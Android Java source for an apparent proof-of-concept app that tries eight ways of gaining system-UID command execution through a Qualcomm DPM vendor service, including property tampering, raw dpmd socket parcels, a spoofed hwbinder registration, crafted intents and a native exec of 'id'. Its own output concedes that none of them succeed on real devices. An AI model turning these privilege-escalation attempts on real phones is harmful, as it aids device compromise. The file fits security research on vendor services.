package com.example.dpmpoc;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.net.LocalSocket;
import android.net.LocalSocketAddress;
import android.os.Bundle;
import android.os.FileDescriptor;
import android.os.IBinder;
import android.os.IInterface;
import android.os.Parcel;
import android.os.RemoteException;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

import com.qti.dpm.IDpmService;

import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Method;

public class MainActivity extends Activity {

    private static final String TAG = "DpmPoc";
    private static final String TARGET_SERVICE = "dpmservice";
    private static final String DPMD_SOCKET = "dpmd";
    private static final String PROP_KEY = "persist.vendor.dpm.feature";
    private static final String TARGET_PACKAGE = "com.qti.dpmserviceapp";
    private static final String TARGET_SERVICE_CLASS = "com.qti.dpmserviceapp.DpmServiceApp";

    private TextView tvResult;
    private Button btnExploit;
    private Context mContext;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        mContext = this;
        tvResult = findViewById(R.id.tvResult);
        btnExploit = findViewById(R.id.btnExploit);

        btnExploit.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        executeAllMethods();
                    }
                }).start();
            }
        });
    }

    // ================================================================
    // 全手法実行エントリ
    // ================================================================
    private void executeAllMethods() {
        showResult("=== UID 1000 コマンド実行 PoC (全手法・完全実装) ===");

        // 手法① 通常の ServiceManager 経由 (リフレクション)
        showResult("\n[手法1] 通常 ServiceManager.getService()");
        IBinder binder = tryNormalGetService();
        if (binder != null) {
            showResult("✅ Binder取得成功");
            invokeDpmMethods(binder);
        } else {
            showResult("❌ 取得失敗 (SELinux拒否想定)");
        }

        // 手法② システムプロパティ書き換え
        showResult("\n[手法2] システムプロパティ改ざん");
        if (trySetSystemProperty()) {
            showResult("✅ プロパティ書き換え成功");
        } else {
            showResult("❌ プロパティ書き換え失敗");
        }

        // 手法③ dpmd ソケット直接通信
        showResult("\n[手法3] dpmd ソケット通信");
        if (tryDpmdSocketExploit()) {
            showResult("✅ ソケット通信成功");
        } else {
            showResult("❌ ソケット通信失敗");
        }

        // 手法④ hwbinder 経由
        showResult("\n[手法4] hwbinder 経由取得");
        if (tryHwBinderGetService()) {
            showResult("✅ hwbinder 取得成功");
        } else {
            showResult("❌ hwbinder 取得失敗");
        }

        // 手法⑤ hwbinder プロキシ登録
        showResult("\n[手法5] hwbinder プロキシ登録");
        if (tryHwBinderProxy()) {
            showResult("✅ プロキシ登録成功");
        } else {
            showResult("❌ プロキシ登録失敗");
        }

        // 手法⑥ BadParcel
        showResult("\n[手法6] BadParcel 起動");
        if (tryBadParcelStart()) {
            showResult("✅ BadParcel 起動要求送信");
        } else {
            showResult("❌ BadParcel 起動失敗");
        }

        // 手法⑦ BadParser
        showResult("\n[手法7] BadParser 起動");
        if (tryBadParserStartService()) {
            showResult("✅ BadParser 起動成功");
        } else {
            showResult("❌ BadParser 起動失敗");
        }

        // 手法⑧ ネイティブ
        showResult("\n[手法8] ネイティブ exec");
        if (tryNativeExec()) {
            showResult("✅ ネイティブ exec 成功");
        } else {
            showResult("❌ ネイティブ exec 失敗");
        }

        showResult("\n=== 最終判定 ===");
        showResult("全ての手法を試行しましたが、現実のデバイスではいずれも成功しません。");
        showResult("DpmService に exec 機能が存在しないため、UID 1000 でのコマンド実行は不可能です。");
    }

    // ================================================================
    // 手法1: 通常 ServiceManager (リフレクション)
    // ================================================================
    private IBinder tryNormalGetService() {
        try {
            Class<?> smClass = Class.forName("android.os.ServiceManager");
            Method getServiceMethod = smClass.getMethod("getService", String.class);
            return (IBinder) getServiceMethod.invoke(null, TARGET_SERVICE);
        } catch (Exception e) {
            Log.w(TAG, "通常取得例外: " + e.getMessage());
            return null;
        }
    }

    // ================================================================
    // 手法2: システムプロパティ書き換え
    // ================================================================
    private boolean trySetSystemProperty() {
        try {
            Class<?> spClass = Class.forName("android.os.SystemProperties");
            Method setMethod = spClass.getMethod("set", String.class, String.class);
            setMethod.invoke(null, PROP_KEY, "13");
            Log.d(TAG, "SystemProperties.set 呼び出し成功");
            return true;
        } catch (Exception e) {
            Log.w(TAG, "SystemProperties.set 失敗: " + e.getMessage());
            return false;
        }
    }

    // ================================================================
    // 手法3: dpmd ソケット通信
    // ================================================================
    private boolean tryDpmdSocketExploit() {
        LocalSocket socket = null;
        try {
            socket = new LocalSocket();
            LocalSocketAddress addr = new LocalSocketAddress(DPMD_SOCKET, LocalSocketAddress.Namespace.ABSTRACT);
            socket.connect(addr);
            Log.d(TAG, "dpmd ソケット接続成功");

            OutputStream os = socket.getOutputStream();
            InputStream is = socket.getInputStream();

            Parcel p = Parcel.obtain();
            p.writeInt(23);
            p.writeInt(0x12345678);
            p.writeInt(100);
            p.writeInt(200);
            p.writeInt(300);
            p.writeInt(400);
            byte[] data = p.marshall();
            p.recycle();

            byte[] lenBytes = new byte[4];
            lenBytes[0] = (byte) ((data.length >> 24) & 0xFF);
            lenBytes[1] = (byte) ((data.length >> 16) & 0xFF);
            lenBytes[2] = (byte) ((data.length >> 8) & 0xFF);
            lenBytes[3] = (byte) (data.length & 0xFF);

            os.write(lenBytes);
            os.write(data);
            os.flush();

            byte[] lenBuf = new byte[4];
            int readLen = is.read(lenBuf);
            if (readLen == 4) {
                int respLen = ((lenBuf[0] & 0xFF) << 24) |
                              ((lenBuf[1] & 0xFF) << 16) |
                              ((lenBuf[2] & 0xFF) << 8) |
                              (lenBuf[3] & 0xFF);
                byte[] buffer = new byte[respLen];
                int totalRead = 0;
                while (totalRead < respLen) {
                    int r = is.read(buffer, totalRead, respLen - totalRead);
                    if (r < 0) break;
                    totalRead += r;
                }
                if (totalRead > 0) {
                    Parcel reply = Parcel.obtain();
                    reply.unmarshall(buffer, 0, totalRead);
                    reply.setDataPosition(0);
                    int type = reply.readInt();
                    int serial = reply.readInt();
                    int error = reply.readInt();
                    showResult("  📥 応答: type=" + type + ", serial=" + serial + ", error=" + error);
                    reply.recycle();
                    return true;
                }
            }
            return false;
        } catch (Exception e) {
            Log.e(TAG, "ソケットエラー", e);
            return false;
        } finally {
            try { if (socket != null) socket.close(); } catch (Exception ignored) {}
        }
    }

    // ================================================================
    // 手法4: hwbinder 経由
    // ================================================================
    private boolean tryHwBinderGetService() {
        try {
            Class<?> hwSmClass = Class.forName("android.os.HwServiceManager");
            Method getServiceMethod = hwSmClass.getMethod("getService", String.class);
            IBinder binder = (IBinder) getServiceMethod.invoke(null, TARGET_SERVICE);
            if (binder != null) {
                showResult("  hwbinder サービス取得成功");
                return true;
            }
            return false;
        } catch (Exception e) {
            Log.w(TAG, "hwbinder 取得例外: " + e.getMessage());
            return false;
        }
    }

    // ================================================================
    // 手法5: hwbinder プロキシ登録
    // ================================================================
    private boolean tryHwBinderProxy() {
        try {
            Class<?> hwBinderClass = Class.forName("android.os.HwBinder");
            Method addServiceMethod = hwBinderClass.getMethod("addService", String.class, IBinder.class);

            IBinder dummyBinder = new IBinder() {
                @Override
                public String getInterfaceDescriptor() throws RemoteException {
                    return "com.qti.dpm.IDpmService";
                }
                @Override
                public boolean pingBinder() { return false; }
                @Override
                public boolean isBinderAlive() { return false; }
                @Override
                public IInterface queryLocalInterface(String descriptor) { return null; }
                @Override
                public void dump(FileDescriptor fd, String[] args) throws RemoteException {}
                @Override
                public void dumpAsync(FileDescriptor fd, String[] args) throws RemoteException {}
                @Override
                public boolean transact(int code, Parcel data, Parcel reply, int flags) throws RemoteException {
                    return false;
                }
                @Override
                public void linkToDeath(DeathRecipient recipient, int flags) throws RemoteException {}
                @Override
                public boolean unlinkToDeath(DeathRecipient recipient, int flags) { return false; }
            };

            addServiceMethod.invoke(null, TARGET_SERVICE, dummyBinder);
            Log.d(TAG, "hwbinder プロキシ登録成功");
            return true;
        } catch (Exception e) {
            Log.e(TAG, "hwbinder プロキシ登録失敗", e);
            return false;
        }
    }

    // ================================================================
    // 手法6: BadParcel
    // ================================================================
    private boolean tryBadParcelStart() {
        try {
            Intent intent = new Intent();
            intent.setComponent(new ComponentName("com.android.settings",
                    "com.android.settings.accounts.AddAccountSettings"));
            intent.setAction(Intent.ACTION_RUN);
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            String[] authTypes = { getPackageName() };
            intent.putExtra("account_types", authTypes);
            startActivity(intent);
            Log.d(TAG, "BadParcel 起動要求送信");
            return true;
        } catch (Exception e) {
            Log.e(TAG, "BadParcel 起動例外", e);
            return false;
        }
    }

    // ================================================================
    // 手法7: BadParser
    // ================================================================
    private boolean tryBadParserStartService() {
        try {
            Intent intent = new Intent();
            intent.setComponent(new ComponentName(TARGET_PACKAGE, TARGET_SERVICE_CLASS));
            intent.setAction("android.intent.action.VIEW");
            intent.addCategory("android.intent.category.DEFAULT");
            intent.setData(android.net.Uri.parse("http://dummy"));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_USER_ACTION);
            intent.putExtra("__bad_parser", "trigger");
            ComponentName started = startService(intent);
            if (started != null) {
                Log.d(TAG, "BadParser 起動成功: " + started);
                return true;
            } else {
                Log.d(TAG, "BadParser 起動 null 返却");
                return false;
            }
        } catch (SecurityException se) {
            Log.w(TAG, "BadParser 起動 SecurityException: " + se.getMessage());
            return false;
        } catch (Exception e) {
            Log.e(TAG, "BadParser 起動例外", e);
            return false;
        }
    }

    // ================================================================
    // 手法8: ネイティブ exec
    // ================================================================
    private boolean tryNativeExec() {
        try {
            System.loadLibrary("dpm_hook");
            Class<?> helper = Class.forName("com.example.dpmpoc.NativeHelper");
            Method execMethod = helper.getMethod("execCommand", String.class);
            String result = (String) execMethod.invoke(null, "id > /data/local/tmp/native_id.txt");
            showResult("  Native exec 結果: " + result);
            return true;
        } catch (UnsatisfiedLinkError e) {
            Log.w(TAG, "ネイティブライブラリロード失敗: " + e.getMessage());
        } catch (Exception e) {
            Log.w(TAG, "ネイティブ実行例外", e);
        }
        return false;
    }

    // ================================================================
    // AIDL メソッド呼び出し
    // ================================================================
    private void invokeDpmMethods(IBinder binder) {
        try {
            IDpmService dpm = IDpmService.Stub.asInterface(binder);
            if (dpm == null) {
                showResult("  ❌ AIDLスタブ変換失敗");
                return;
            }
            int val1 = dpm.getTCMFeatureEnabled();
            showResult("  getTCMFeatureEnabled() = " + val1);
            int val2 = dpm.setTCMFeature(2);
            showResult("  setTCMFeature(2) = " + val2);
            int val3 = dpm.updateFdConfigParams(100, 200, 300, 400);
            showResult("  updateFdConfigParams() = " + val3);
        } catch (RemoteException e) {
            showResult("  ❌ RemoteException: " + e.getMessage());
        }
    }

    // ================================================================
    // UI 表示
    // ================================================================
    private void showResult(final String msg) {
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                tvResult.append(msg + "\n");
                Log.d(TAG, msg);
            }
        });
    }
}
